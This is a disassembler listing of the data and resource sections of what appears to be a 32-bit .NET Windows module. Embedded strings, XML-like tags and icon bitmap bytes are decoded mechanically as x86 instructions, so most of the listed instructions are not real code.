1100c8d4:	inc    ebp
1100c8d5:	pop    edi
1100c8d6:	push   eax
1100c8d7:	push   edx
1100c8d8:	inc    ebp
1100c8d9:	dec    ebp
1100c8da:	inc    ecx
1100c8db:	push   edx
1100c8dc:	dec    ebx
1100c8dd:	inc    ebx
1100c8de:	dec    eax
1100c8df:	inc    ecx
1100c8e0:	push   edx
1100c8e1:	dec    ebp
1100c8e2:	inc    ecx
1100c8e3:	push   eax
1100c8e4:	pop    edi
1100c8e5:	dec    edi
1100c8e6:	push   eax
1100c8e7:	push   esp
1100c8e8:	dec    ecx
1100c8e9:	dec    edi
1100c8ea:	dec    esi
1100c8eb:	pop    edi
1100c8ec:	inc    esp
1100c8ed:	inc    ebp
1100c8ee:	push   ebx
1100c8ef:	inc    ebx
1100c8f0:	cmp    al,0x2f
1100c8f2:	push   eax
1100c8f3:	popa   
1100c8f4:	jb     0x1100c957
1100c8f6:	addr16 jb 0x1100c95a
1100c8f9:	jo     0x1100c963
1100c8fb:	ds or  eax,0x2020200a
1100c901:	and    BYTE PTR [eax],ah
1100c903:	and    BYTE PTR [eax],ah
1100c905:	and    BYTE PTR [edi+ebp*1],bh
1100c908:	push   esp
1100c909:	popa   
1100c90a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c90e:	gs ins BYTE PTR es:[edi],dx
1100c910:	ins    BYTE PTR es:[edi],dx
1100c911:	ds or  eax,0x2020200a
1100c917:	and    BYTE PTR [eax],ah
1100c919:	and    BYTE PTR [edi+ebp*1],bh
1100c91c:	push   esp
1100c91d:	popa   
1100c91e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c922:	outs   dx,DWORD PTR ds:[esi]
1100c923:	ja     0x1100c963
1100c925:	or     eax,0x200a0d0a
1100c92a:	and    BYTE PTR [eax],ah
1100c92c:	and    BYTE PTR [eax],ah
1100c92e:	and    BYTE PTR [esp+edx*2],bh
1100c931:	popa   
1100c932:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c936:	outs   dx,DWORD PTR ds:[esi]
1100c937:	ja     0x1100c977
1100c939:	or     eax,0x2020200a
1100c93e:	and    BYTE PTR [eax],ah
1100c940:	and    BYTE PTR [eax],ah
1100c942:	and    BYTE PTR [esp+edx*2],bh
1100c945:	popa   
1100c946:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c94a:	gs ins BYTE PTR es:[edi],dx
1100c94c:	ins    BYTE PTR es:[edi],dx
1100c94d:	and    BYTE PTR [ebx+0x6f],al
1100c950:	ins    BYTE PTR es:[edi],dx
1100c951:	jne    0x1100c9c0
1100c953:	outs   dx,BYTE PTR ds:[esi]
1100c954:	push   ebx
1100c955:	jo     0x1100c9b8
1100c957:	outs   dx,BYTE PTR ds:[esi]
1100c958:	cmp    eax,0x3e223222
1100c95d:	or     eax,0x2020200a
1100c962:	and    BYTE PTR [eax],ah
1100c964:	and    BYTE PTR [eax],ah
1100c966:	and    BYTE PTR [edi+ebp*1],bh
1100c969:	push   esp
1100c96a:	popa   
1100c96b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c96f:	gs ins BYTE PTR es:[edi],dx
1100c971:	ins    BYTE PTR es:[edi],dx
1100c972:	ds or  eax,0x2020200a
1100c978:	and    BYTE PTR [eax],ah
1100c97a:	and    BYTE PTR [edi+ebp*1],bh
1100c97d:	push   esp
1100c97e:	popa   
1100c97f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c983:	outs   dx,DWORD PTR ds:[esi]
1100c984:	ja     0x1100c9c4
1100c986:	or     eax,0x2020200a
1100c98b:	and    BYTE PTR [edi+ebp*1],bh
1100c98e:	push   esp
1100c98f:	popa   
1100c990:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c994:	outs   dx,DWORD PTR ds:[esi]
1100c995:	ja     0x1100c9de
1100c997:	jb     0x1100ca08
1100c999:	jne    0x1100ca0b
1100c99b:	ds or  eax,0x200a0d0a
1100c9a1:	and    BYTE PTR [edi+ebp*1],bh
1100c9a4:	push   esp
1100c9a5:	popa   
1100c9a6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3e]
1100c9aa:	or     eax,0x200a0d0a
1100c9af:	and    BYTE PTR [eax+edx*2],bh
1100c9b2:	popa   
1100c9b3:	jb     0x1100ca16
1100c9b5:	addr16 jb 0x1100ca19
1100c9b8:	jo     0x1100ca22
1100c9ba:	ds inc ebx
1100c9bc:	dec    esp
1100c9bd:	dec    ecx
1100c9be:	pop    edi
1100c9bf:	push   ebp
1100c9c0:	push   ebx
1100c9c1:	inc    ecx
1100c9c2:	inc    edi
1100c9c3:	inc    ebp
1100c9c4:	pop    edi
1100c9c5:	inc    ebp
1100c9c6:	pop    eax
1100c9c7:	push   esp
1100c9c8:	pop    edi
1100c9c9:	dec    edi
1100c9ca:	push   eax
1100c9cb:	push   esp
1100c9cc:	dec    ecx
1100c9cd:	dec    edi
1100c9ce:	dec    esi
1100c9cf:	dec    ebx
1100c9d0:	inc    ebp
1100c9d1:	pop    ecx
1100c9d2:	cmp    al,0x2f
1100c9d4:	push   eax
1100c9d5:	popa   
1100c9d6:	jb     0x1100ca39
1100c9d8:	addr16 jb 0x1100ca3c
1100c9db:	jo     0x1100ca45
1100c9dd:	ds or  eax,0x3c20200a
1100c9e3:	push   eax
1100c9e4:	popa   
1100c9e5:	jb     0x1100ca48
1100c9e7:	addr16 jb 0x1100ca4b
1100c9ea:	jo     0x1100ca54
1100c9ec:	ds inc ebx
1100c9ee:	dec    esp
1100c9ef:	dec    ecx
1100c9f0:	pop    edi
1100c9f1:	push   ebp
1100c9f2:	push   ebx
1100c9f3:	inc    ecx
1100c9f4:	inc    edi
1100c9f5:	inc    ebp
1100c9f6:	pop    edi
1100c9f7:	inc    ebp
1100c9f8:	pop    eax
1100c9f9:	push   esp
1100c9fa:	dec    edi
1100c9fb:	push   eax
1100c9fc:	push   esp
1100c9fd:	dec    ecx
1100c9fe:	dec    edi
1100c9ff:	dec    esi
1100ca00:	push   ebx
1100ca01:	pop    edi
1100ca02:	dec    edi
1100ca03:	push   esi
1100ca04:	inc    ebp
1100ca05:	push   edx
1100ca06:	push   edx
1100ca07:	dec    ecx
1100ca08:	inc    esp
1100ca09:	inc    ebp
1100ca0a:	pop    edi
1100ca0b:	inc    ebx
1100ca0c:	dec    edi
1100ca0d:	dec    esi
1100ca0e:	inc    esi
1100ca0f:	dec    ecx
1100ca10:	inc    edi
1100ca11:	inc    esi
1100ca12:	dec    ecx
1100ca13:	dec    esp
1100ca14:	inc    ebp
1100ca15:	cmp    al,0x2f
1100ca17:	push   eax
1100ca18:	popa   
1100ca19:	jb     0x1100ca7c
1100ca1b:	addr16 jb 0x1100ca7f
1100ca1e:	jo     0x1100ca88
1100ca20:	ds or  eax,0xd20200a
1100ca26:	or     bh,BYTE PTR [edi+ebp*1]
1100ca29:	push   ebx
1100ca2a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
1100ca2f:	outs   dx,BYTE PTR ds:[esi]
1100ca30:	ds or  eax,0xca5c000a
	...
1100ca3e:	add    BYTE PTR [eax],al
1100ca40:	jle    0x1100ca0c
1100ca42:	add    BYTE PTR [eax],al
1100ca44:	add    BYTE PTR [eax],ah
	...
1100ca5a:	add    BYTE PTR [eax],al
1100ca5c:	jo     0x1100ca28
	...
1100ca72:	pop    edi
1100ca73:	inc    ebx
1100ca74:	outs   dx,DWORD PTR ds:[esi]
1100ca75:	jb     0x1100cabc
1100ca77:	js     0x1100cade
1100ca79:	dec    ebp
1100ca7a:	popa   
1100ca7b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
1100ca82:	jb     0x1100cae9
1100ca84:	gs cs fs ins BYTE PTR es:[edi],dx
1100ca88:	ins    BYTE PTR es:[edi],dx
1100ca89:	add    BYTE PTR [eax],al
1100ca8b:	add    BYTE PTR [eax],al
1100ca8d:	add    bh,bh
1100ca8f:	and    eax,0x11002000

Disassembly of section .rsrc:

1100e000 <.rsrc>:
	...
1100e00c:	add    BYTE PTR [eax],al
1100e00e:	add    al,0x0
1100e010:	add    eax,DWORD PTR [eax]
1100e012:	add    BYTE PTR [eax],al
1100e014:	xor    BYTE PTR [eax],al
1100e016:	add    BYTE PTR [eax+0xe],al
1100e01c:	mov    eax,0x10800000
1100e021:	add    BYTE PTR [eax],al
1100e023:	add    al,dl
1100e025:	add    BYTE PTR [eax],al
1100e027:	sbb    BYTE PTR [eax],0x0
1100e02a:	add    BYTE PTR [eax],al
1100e02c:	call   0x1180e031
	...
1100e03d:	add    BYTE PTR [edi],cl
1100e03f:	add    BYTE PTR [edx],al
1100e041:	add    BYTE PTR [eax],al
1100e043:	add    BYTE PTR [eax],al
1100e045:	add    DWORD PTR [eax],eax
1100e047:	add    BYTE PTR [ebx],0x0
1100e04a:	add    BYTE PTR [eax],al
1100e04c:	sbb    BYTE PTR [ecx],al
1100e04e:	add    BYTE PTR [eax+0x4],al
1100e054:	xor    BYTE PTR [ecx],al
1100e056:	add    BYTE PTR [eax+0x5],al
1100e05c:	dec    eax
1100e05d:	add    DWORD PTR [eax],eax
1100e05f:	add    BYTE PTR [esi],0x0
1100e062:	add    BYTE PTR [eax],al
1100e064:	pusha  
1100e065:	add    DWORD PTR [eax],eax
1100e067:	add    BYTE PTR [edi],0x0
1100e06a:	add    BYTE PTR [eax],al
1100e06c:	js     0x1100e06f
1100e06e:	add    BYTE PTR [eax+0x8],al
1100e074:	nop
1100e075:	add    DWORD PTR [eax],eax
1100e077:	or     BYTE PTR [ecx],0x0
1100e07a:	add    BYTE PTR [eax],al
1100e07c:	test   al,0x1
1100e07e:	add    BYTE PTR [eax+0xa],al
1100e084:	rol    BYTE PTR [ecx],0x0
1100e087:	or     BYTE PTR [ebx],0x0
1100e08a:	add    BYTE PTR [eax],al
1100e08c:	fadd   DWORD PTR [ecx]
1100e08e:	add    BYTE PTR [eax+0xc],al
1100e094:	lock add DWORD PTR [eax],eax
1100e097:	or     BYTE PTR ds:0x8000000,0x2
1100e09e:	add    BYTE PTR [eax+0xe],al
1100e0a4:	and    BYTE PTR [edx],al
1100e0a6:	add    BYTE PTR [eax+0xf],al
1100e0ac:	cmp    BYTE PTR [edx],al
1100e0ae:	add    BYTE PTR [eax+0x10],al
1100e0b4:	push   eax
1100e0b5:	add    al,BYTE PTR [eax]
1100e0b7:	add    BYTE PTR [eax],0x0
	...
1100e0c6:	add    DWORD PTR [eax],eax
1100e0c8:	add    BYTE PTR [edi+0x0],bh
1100e0cb:	add    BYTE PTR [eax+0x2],ch
1100e0ce:	add    BYTE PTR [eax+0x0],al
	...
1100e0dc:	add    BYTE PTR [eax],al
1100e0de:	add    DWORD PTR [eax],eax
1100e0e0:	add    DWORD PTR [eax],eax
1100e0e2:	add    BYTE PTR [eax],al
1100e0e4:	add    BYTE PTR [edx],0x0
1100e0e7:	add    BYTE PTR [eax],0x0
	...
1100e0f6:	add    DWORD PTR [eax],eax
1100e0f8:	add    DWORD PTR [eax],eax
1100e0fa:	add    BYTE PTR [eax],al
1100e0fc:	cwde   
1100e0fd:	add    al,BYTE PTR [eax]
1100e0ff:	add    BYTE PTR [eax],0x0
	...
1100e10e:	add    DWORD PTR [eax],eax
1100e110:	add    BYTE PTR [eax],al
1100e112:	add    BYTE PTR [eax],al
1100e114:	mov    al,0x2
	...
1100e126:	add    DWORD PTR [eax],eax
1100e128:	add    BYTE PTR [eax],al
1100e12a:	add    BYTE PTR [eax],al
1100e12c:	rol    BYTE PTR [edx],0x0
	...
1100e13b:	add    BYTE PTR [eax],al
1100e13d:	add    BYTE PTR [ecx],al
1100e13f:	add    BYTE PTR [eax],al
1100e141:	add    BYTE PTR [eax],al
1100e143:	add    al,dl
1100e145:	add    al,BYTE PTR [eax]
	...
1100e153:	add    BYTE PTR [eax],al
1100e155:	add    BYTE PTR [ecx],al
1100e157:	add    BYTE PTR [eax],al
1100e159:	add    BYTE PTR [eax],al
1100e15b:	add    al,ah
1100e15d:	add    al,BYTE PTR [eax]
	...
1100e16b:	add    BYTE PTR [eax],al
1100e16d:	add    BYTE PTR [ecx],al
1100e16f:	add    BYTE PTR [eax],al
1100e171:	add    BYTE PTR [eax],al
1100e173:	add    al,dh
1100e175:	add    al,BYTE PTR [eax]
	...
1100e183:	add    BYTE PTR [eax],al
1100e185:	add    BYTE PTR [ecx],al
1100e187:	add    BYTE PTR [eax],al
1100e189:	add    BYTE PTR [eax],al
1100e18b:	add    BYTE PTR [eax],al
1100e18d:	add    eax,DWORD PTR [eax]
	...
1100e19b:	add    BYTE PTR [eax],al
1100e19d:	add    BYTE PTR [ecx],al
1100e19f:	add    BYTE PTR [eax],al
1100e1a1:	add    BYTE PTR [eax],al
1100e1a3:	add    BYTE PTR [eax],dl
1100e1a5:	add    eax,DWORD PTR [eax]
	...
1100e1b3:	add    BYTE PTR [eax],al
1100e1b5:	add    BYTE PTR [ecx],al
1100e1b7:	add    BYTE PTR [eax],al
1100e1b9:	add    BYTE PTR [eax],al
1100e1bb:	add    BYTE PTR [eax],ah
1100e1bd:	add    eax,DWORD PTR [eax]
	...
1100e1cb:	add    BYTE PTR [eax],al
1100e1cd:	add    BYTE PTR [ecx],al
1100e1cf:	add    BYTE PTR [eax],al
1100e1d1:	add    BYTE PTR [eax],al
1100e1d3:	add    BYTE PTR [eax],dh
1100e1d5:	add    eax,DWORD PTR [eax]
	...
1100e1e3:	add    BYTE PTR [eax],al
1100e1e5:	add    BYTE PTR [ecx],al
1100e1e7:	add    BYTE PTR [eax],al
1100e1e9:	add    BYTE PTR [eax],al
1100e1eb:	add    BYTE PTR [eax+0x3],al
	...
1100e1fe:	add    DWORD PTR [eax],eax
1100e200:	add    BYTE PTR [eax],al
1100e202:	add    BYTE PTR [eax],al
1100e204:	push   eax
1100e205:	add    eax,DWORD PTR [eax]
	...
1100e213:	add    BYTE PTR [eax],al
1100e215:	add    BYTE PTR [ecx],al
1100e217:	add    BYTE PTR [eax],al
1100e219:	add    BYTE PTR [eax],al
1100e21b:	add    BYTE PTR [eax+0x3],ah
	...
1100e22e:	add    DWORD PTR [eax],eax
1100e230:	add    BYTE PTR [eax],al
1100e232:	add    BYTE PTR [eax],al
1100e234:	jo     0x1100e239
	...
1100e246:	add    DWORD PTR [eax],eax
1100e248:	add    BYTE PTR [eax],al
1100e24a:	add    BYTE PTR [eax],al
1100e24c:	add    BYTE PTR [ebx],0x0
	...
1100e25b:	add    BYTE PTR [eax],al
1100e25d:	add    BYTE PTR [ecx],al
1100e25f:	add    BYTE PTR [eax],al
1100e261:	add    BYTE PTR [eax],al
1100e263:	add    BYTE PTR [eax+0x3],dl
	...
1100e275:	add    BYTE PTR [ecx],al
1100e277:	add    BYTE PTR [eax],al
1100e279:	add    BYTE PTR [eax],al
1100e27b:	add    BYTE PTR [eax+0x3],ah
	...
1100e28d:	add    BYTE PTR [ecx],al
1100e28f:	add    BYTE PTR [eax],al
1100e291:	add    BYTE PTR [eax],al
1100e293:	add    BYTE PTR [eax+0x3],dh
	...
1100e2a5:	add    BYTE PTR [ecx],al
1100e2a7:	add    BYTE PTR [eax],al
1100e2a9:	add    BYTE PTR [eax],al
1100e2ab:	add    al,al
1100e2ad:	add    eax,DWORD PTR [eax]
1100e2af:	add    al,dl
1100e2b1:	jecxz  0x1100e2b3
1100e2b3:	add    BYTE PTR [eax+0x6],ch
	...
1100e2be:	add    BYTE PTR [eax],al
1100e2c0:	cmp    dl,ch
1100e2c2:	add    BYTE PTR [eax],al
1100e2c4:	enter  0x4,0x0
	...
1100e2d0:	add    bh,ch
1100e2d2:	add    BYTE PTR [eax],al
1100e2d4:	call   0x1100e2db
1100e2d9:	add    BYTE PTR [eax],al
1100e2db:	add    BYTE PTR [eax],al
1100e2dd:	add    BYTE PTR [eax],al
1100e2df:	add    al,ch
1100e2e1:	icebp  
1100e2e2:	add    BYTE PTR [eax],al
1100e2e4:	call   0x1100e2ea
1100e2e9:	add    BYTE PTR [eax],al
1100e2eb:	add    BYTE PTR [eax],al
1100e2ed:	add    BYTE PTR [eax],al
1100e2ef:	add    al,dl
1100e2f1:	repz add BYTE PTR [eax],al
1100e2f4:	sub    BYTE PTR [ecx],al
	...
1100e2fe:	add    BYTE PTR [eax],al
1100e300:	clc    
1100e301:	hlt    
1100e302:	add    BYTE PTR [eax],al
1100e304:	test   al,0xe
	...
1100e30e:	add    BYTE PTR [eax],al
1100e310:	mov    al,ds:0xa8000103
1100e315:	or     eax,DWORD PTR [eax]
	...
1100e31f:	add    BYTE PTR [eax+0xf],cl
1100e322:	add    DWORD PTR [eax],eax
1100e324:	test   al,0x8
	...
1100e32e:	add    BYTE PTR [eax],al
1100e330:	lock pop ss
1100e332:	add    DWORD PTR [eax],eax
1100e334:	enter  0x6,0x0
	...
1100e340:	mov    eax,0x6800011e
1100e345:	add    eax,0x0
1100e34a:	add    BYTE PTR [eax],al
1100e34c:	add    BYTE PTR [eax],al
1100e34e:	add    BYTE PTR [eax],al
1100e350:	and    BYTE PTR [ecx+eax*1],ah
1100e353:	add    BYTE PTR [eax+0x25],ch
1100e359:	add    BYTE PTR [eax],al
1100e35b:	add    BYTE PTR [eax],al
1100e35d:	add    BYTE PTR [eax],al
1100e35f:	add    al,cl
1100e361:	dec    ecx
1100e362:	add    DWORD PTR [eax],eax
1100e364:	push   0x1a
1100e369:	add    BYTE PTR [eax],al
1100e36b:	add    BYTE PTR [eax],al
1100e36d:	add    BYTE PTR [eax],al
1100e36f:	add    BYTE PTR [eax],dh
1100e371:	add    DWORD PTR fs:[eax],eax
1100e374:	test   al,0x10
	...
1100e37e:	add    BYTE PTR [eax],al
1100e380:	fdiv   DWORD PTR [ecx+eax*1+0x0]
1100e384:	mov    BYTE PTR [ecx],cl
	...
1100e38e:	add    BYTE PTR [eax],al
1100e390:	pusha  
1100e391:	jle    0x1100e394
1100e393:	add    BYTE PTR [eax+0x4],ch
	...
1100e39e:	add    BYTE PTR [eax],al
1100e3a0:	enter  0x182,0x0
1100e3a4:	fadd   DWORD PTR [eax]
	...
1100e3ae:	add    BYTE PTR [eax],al
1100e3b0:	mov    al,ds:0xb4000183
1100e3b5:	add    eax,DWORD PTR [eax]
	...
1100e3bf:	add    BYTE PTR [eax-0x79],bl
1100e3c2:	add    DWORD PTR [eax],eax
1100e3c4:	adc    al,BYTE PTR [ebx]
	...
1100e3ce:	add    BYTE PTR [eax],al
1100e3d0:	sub    BYTE PTR [eax],al
1100e3d2:	add    BYTE PTR [eax],al
1100e3d4:	xor    BYTE PTR [eax],al
1100e3d6:	add    BYTE PTR [eax],al
1100e3d8:	pusha  
1100e3d9:	add    BYTE PTR [eax],al
1100e3db:	add    BYTE PTR [ecx],al
1100e3dd:	add    BYTE PTR [eax+eax*1],al
	...
1100e3fc:	add    BYTE PTR [eax],al
1100e3fe:	add    BYTE PTR [eax],0x0
1100e401:	add    BYTE PTR [eax],0x0
1100e404:	add    BYTE PTR [eax+0x800080],al
1100e40a:	add    BYTE PTR [eax],al
1100e40c:	add    BYTE PTR [eax],0x80
1100e40f:	add    BYTE PTR [eax-0x7fffff80],al
1100e415:	add    BYTE PTR [eax-0x1000000],0x0
1100e41c:	add    bh,bh
1100e41e:	add    BYTE PTR [eax],al
1100e420:	add    bh,bh
1100e422:	inc    DWORD PTR [eax]
1100e424:	inc    DWORD PTR [eax]
1100e426:	add    BYTE PTR [eax],al
1100e428:	inc    DWORD PTR [eax]
1100e42a:	inc    DWORD PTR [eax]
1100e42c:	(bad)  
1100e42d:	inc    DWORD PTR [eax]
1100e42f:	add    al,al
1100e431:	rol    al,0x0
1100e434:	(bad)  
1100e435:	(bad)  
1100e436:	inc    DWORD PTR [eax]
	...
1100e488:	add    BYTE PTR [eax],al
1100e48a:	add    BYTE PTR [edi],cl
1100e48c:	in     eax,0x0
	...
1100e4a2:	add    bh,bh
1100e4a4:	inc    DWORD PTR [eax]
	...
1100e4ba:	ud0    edi,edi
1100e4bd:	lock add BYTE PTR [eax],al
	...
1100e4d0:	add    BYTE PTR [edi+ebp*8],al
1100e4d3:	(bad)  
1100e4d4:	(bad)  
1100e4d5:	inc    DWORD PTR [eax+0x0]
	...
1100e4e0:	add    BYTE PTR [eax],al
1100e4e2:	add    BYTE PTR [esp+eiz*2],al
1100e4e5:	jbe    0x1100e52d
1100e4e7:	add    al,0x0
1100e4e9:	dec    edi
1100e4ea:	(bad)  
1100e4eb:	(bad)  
1100e4ec:	(bad)  
1100e4ed:	jmp    eax
1100e4ef:	add    BYTE PTR [edx+0x42],al
1100e4f2:	push   esi
1100e4f3:	inc    ax
1100e4f5:	add    BYTE PTR [eax],al
1100e4f7:	add    BYTE PTR [eax],al
1100e4f9:	add    BYTE PTR [eax],al
1100e4fb:	push   es
1100e4fc:	jmp    0x1100e4e9
1100e4fe:	ja     0x1100e560
1100e500:	add    bh,bh
1100e502:	(bad)  
1100e503:	(bad)  
1100e504:	(bad)  
1100e505:	(bad)  
1100e506:	inc    DWORD PTR [eax]
1100e508:	pop    es
1100e509:	mov    dh,0xeb
1100e50b:	ja     0x1100e56d
1100e50d:	add    BYTE PTR [eax],al
1100e50f:	add    BYTE PTR [eax],al
1100e511:	add    BYTE PTR [eax],al
1100e513:	pop    es
1100e514:	mov    esi,0xf0074db
1100e519:	(bad)  
1100e51a:	(bad)  
1100e51b:	(bad)  
1100e51c:	(bad)  
1100e51d:	(bad)  
1100e51e:	jmp    esp
1100e520:	add    BYTE PTR [edi+0x7b],al
1100e523:	in     eax,dx
1100e524:	inc    eax
1100e525:	add    BYTE PTR [eax],al
1100e527:	add    BYTE PTR [eax],al
1100e529:	add    BYTE PTR [eax],al
1100e52b:	push   es
1100e52c:	mov    bh,0x76
1100e52e:	pusha  
1100e52f:	add    al,0xef
1100e531:	(bad)  
1100e532:	(bad)  
1100e533:	(bad)  
1100e534:	(bad)  
1100e535:	(bad)  
1100e536:	(bad)  
1100e537:	inc    DWORD PTR [eax]
1100e539:	and    al,0x67
1100e53b:	mov    esi,0x50
1100e540:	add    BYTE PTR [eax],al
1100e542:	add    BYTE PTR [edi],al
1100e544:	ja     0x1100e58a
1100e546:	add    BYTE PTR [edi-0x1],cl
1100e549:	(bad)  
1100e54a:	(bad)  
1100e54b:	(bad)  
1100e54c:	(bad)  
1100e54d:	(bad)  
1100e54e:	(bad)  
1100e54f:	push   eax
1100e551:	inc    eax
1100e552:	inc    edi
1100e553:	jbe    0x1100e5b5
1100e555:	add    BYTE PTR [eax],al
1100e557:	add    BYTE PTR [eax],al
1100e559:	add    BYTE PTR [eax],al
1100e55b:	add    al,0x67
1100e55d:	fs add bh,bh
1100e560:	(bad)  
1100e561:	(bad)  
1100e562:	out    dx,al
1100e563:	jmp    0x1100e540
1100e565:	out    dx,al
1100e566:	(bad)  
1100e567:	(bad)  
1100e568:	inc    BYTE PTR [eax+0x24]
1100e56b:	inc    edi
1100e56c:	inc    eax
1100e56d:	add    BYTE PTR [eax],al
1100e56f:	add    BYTE PTR [eax],al
1100e571:	add    BYTE PTR [eax],al
1100e573:	add    al,0x74
1100e575:	add    BYTE PTR [edi],bl
1100e577:	(bad)  
1100e578:	(bad)  
1100e579:	jmp    0x1100e566
1100e57b:	xlat   BYTE PTR ds:[ebx]
1100e57c:	mov    esi,0xffffbebd
1100e581:	lock add BYTE PTR [edi+0x40],ah
1100e585:	add    BYTE PTR [eax],al
1100e587:	add    BYTE PTR [eax],al
1100e589:	add    BYTE PTR [eax],al
1100e58b:	push   es
1100e58c:	push   eax
1100e58d:	add    al,0xef
1100e58f:	(bad)  
1100e590:	sti    
1100e591:	in     eax,dx
1100e592:	mov    esi,0xbdb7bebd
1100e597:	mov    esi,0x740ffff
1100e59c:	inc    eax
1100e59d:	add    BYTE PTR [eax],al
1100e59f:	add    BYTE PTR [eax],al
1100e5a1:	add    BYTE PTR [eax],al
1100e5a3:	add    al,0x0
1100e5a5:	das    
1100e5a6:	(bad)  
1100e5a7:	(bad)  
1100e5a8:	mov    esi,0xbebeb7be
1100e5ad:	mov    ebp,0xffefbeb7
1100e5b2:	loopne 0x1100e5b8
1100e5b4:	and    BYTE PTR [eax],al
1100e5b6:	add    BYTE PTR [eax],al
1100e5b8:	add    BYTE PTR [eax],al
1100e5ba:	add    BYTE PTR [eax],al
1100e5bc:	add    al,0xef
1100e5be:	(bad)  
1100e5bf:	out    dx,al
1100e5c0:	fidivr WORD PTR [esi-0x41418283]
1100e5c6:	mov    bh,0xb7
1100e5c8:	mov    esi,0xffff
1100e5cd:	add    BYTE PTR [eax],al
1100e5cf:	add    BYTE PTR [eax],al
1100e5d1:	add    BYTE PTR [eax],al
1100e5d3:	add    BYTE PTR [edi],cl
1100e5d5:	(bad)  
1100e5d6:	(bad)  
1100e5d7:	fidivr WORD PTR [esi-0x41414843]
1100e5dd:	mov    ebp,0xffbebdbe
1100e5e2:	jmp    esp
	...
1100e5ec:	(bad)  
1100e5ed:	(bad)  
1100e5ee:	(bad)  
1100e5ef:	mov    esi,0xbede7ede
1100e5f4:	fucomi st,st(3)
1100e5f6:	fstp   TBYTE PTR [ebx-0x25]
1100e5f9:	jg     0x1100e5fa
1100e5fb:	inc    DWORD PTR [eax]
1100e5fd:	add    BYTE PTR [eax],al
1100e5ff:	add    BYTE PTR [eax],al
1100e601:	add    BYTE PTR [eax],al
1100e603:	ud0    edi,edi
1100e606:	mul    edi
1100e608:	mov    esi,0xbeb7bebe
1100e60d:	mov    ebp,0x7fdbeb7b
1100e612:	(bad)  
1100e613:	push   eax
1100e615:	add    BYTE PTR [eax],al
1100e617:	add    BYTE PTR [eax],al
1100e619:	add    BYTE PTR [eax],al
1100e61b:	(bad)  
1100e61c:	(bad)  
1100e61d:	(bad)  
1100e61e:	sti    
1100e61f:	fidivr WORD PTR [ebp+0x7d]
1100e622:	out    dx,al
1100e623:	fidivr WORD PTR [esi+0x76ebdbbc]
1100e629:	mov    esi,0xffffff
1100e62e:	add    BYTE PTR [eax],al
1100e630:	add    BYTE PTR [eax],al
1100e632:	push   cs
1100e633:	(bad)  
1100e634:	(bad)  
1100e635:	(bad)  
1100e636:	in     eax,dx
1100e637:	out    dx,al
1100e638:	mov    esi,0xedeb7be7
1100e63d:	ja     0x1100e61a
1100e63f:	jmp    0x1100e61c
1100e641:	jle    0x1100e642
1100e643:	(bad)  
1100e644:	push   eax
1100e646:	add    BYTE PTR [eax],al
1100e648:	add    BYTE PTR [edi+edi*8],al
1100e64b:	(bad)  
1100e64c:	(bad)  
1100e64d:	(bad)  
1100e64e:	jmp    0x1100e63d
1100e650:	jmp    0x1100e63f
1100e652:	out    0x7e,eax
1100e654:	mov    esi,0xb7bebebe
1100e659:	mov    bh,0xff
1100e65b:	(bad)  
1100e65c:	(bad)  
1100e65d:	(bad)  
1100e65e:	jo     0x1100e660
1100e660:	add    BYTE PTR [edi-0x1],ch
1100e663:	(bad)  
1100e664:	(bad)  
1100e665:	(bad)  
1100e666:	jmp    0x1100e656
1100e668:	mov    esi,0xd7debede
1100e66d:	xlat   BYTE PTR ds:[ebx]
1100e66e:	mov    esi,0xffbdbebd
1100e673:	(bad)  
1100e674:	(bad)  
1100e675:	push   eax
1100e677:	add    BYTE PTR [ecx],al
1100e679:	ud0    edi,edi
1100e67c:	(bad)  
1100e67d:	(bad)  
1100e67e:	jge    0x1100e6fe
1100e680:	out    dx,al
1100e681:	jle    0x1100e671
1100e683:	mov    esi,0xbe7eedeb
1100e688:	mov    bh,0xb7
1100e68a:	(bad)  
1100e68b:	(bad)  
1100e68c:	(bad)  
1100e68d:	push   eax
1100e68f:	add    BYTE PTR [eax],al
1100e691:	add    bh,bh
1100e693:	(bad)  
1100e694:	(bad)  
1100e695:	jmp    edi
1100e697:	out    dx,al
1100e698:	fsubp  st(6),st
1100e69a:	in     eax,dx
1100e69b:	ja     0x1100e688
1100e69d:	jmp    0x1100e68a
1100e69f:	xlat   BYTE PTR ds:[ebx]
1100e6a0:	fstp   TBYTE PTR [ebp-0x1]
1100e6a3:	(bad)  
1100e6a4:	(bad)  
1100e6a5:	inc    DWORD PTR [eax]
1100e6a7:	add    BYTE PTR [eax],al
1100e6a9:	add    BYTE PTR [edi],cl
1100e6ab:	(bad)  
1100e6ac:	(bad)  
1100e6ad:	(bad)  
1100e6ae:	in     eax,dx
1100e6af:	out    dx,al
1100e6b0:	out    dx,al
1100e6b1:	fsubp  st(6),st
1100e6b3:	in     eax,dx
1100e6b4:	out    0xed,eax
1100e6b6:	jmp    0x1100e6a3
1100e6b8:	out    0xbe,eax
1100e6ba:	(bad)  
1100e6bb:	(bad)  
1100e6bc:	push   eax
1100e6be:	add    BYTE PTR [eax],al
1100e6c0:	add    BYTE PTR [eax],al
1100e6c2:	add    bh,bh
1100e6c4:	(bad)  
1100e6c5:	(bad)  
1100e6c6:	(bad)  
1100e6c7:	out    dx,al
1100e6c8:	out    dx,al
1100e6c9:	out    dx,al
1100e6ca:	out    dx,al
1100e6cb:	fidivr WORD PTR [esi-0x14141425]
1100e6d1:	(bad)  
1100e6d3:	(bad)  
1100e6d4:	inc    DWORD PTR [eax]
1100e6d6:	add    BYTE PTR [eax],al
1100e6d8:	add    BYTE PTR [eax],al
1100e6da:	add    BYTE PTR [edi],cl
1100e6dc:	(bad)  
1100e6dd:	(bad)  
1100e6de:	(bad)  
1100e6df:	fsubp  st(6),st
1100e6e1:	(bad)  
1100e6e2:	out    dx,al
1100e6e3:	out    0xee,eax
1100e6e5:	ja     0x1100e764
1100e6e7:	in     eax,dx
1100e6e8:	mov    bh,0xbf
1100e6ea:	(bad)  
1100e6eb:	push   eax
1100e6ed:	add    BYTE PTR [eax],al
1100e6ef:	add    BYTE PTR [eax],al
